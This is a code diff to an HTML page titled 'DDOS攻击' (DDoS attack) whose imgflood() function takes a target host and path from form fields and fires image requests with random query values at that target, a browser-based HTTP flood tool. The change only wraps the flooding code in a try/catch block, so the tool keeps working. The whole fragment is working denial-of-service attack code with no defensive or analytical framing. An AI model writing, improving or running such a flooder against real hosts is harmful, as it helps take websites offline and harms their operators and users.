@@ -6,11 +6,15 @@
   <title>DDOS攻击</title>
   <script>
     function imgflood() {
-      var TARGET = document.getElementById("Target").value;
-      var URI = document.getElementById("file").value;
-      var pic = new Image();
-      var rand = Math.floor(Math.random() * 1000);
-      pic.src = 'http://' + TARGET + '/' + URI + rand + '=val';
+      try {
+        var TARGET = document.getElementById("Target").value;
+        var URI = document.getElementById("file").value;
+        var pic = new Image();
+        var rand = Math.floor(Math.random() * 1000);
+        pic.src = 'http://' + TARGET + '/' + URI + rand + '=val';
+      } catch (error) {
+        info(error);
+      }
     }
   </script>
   <style>
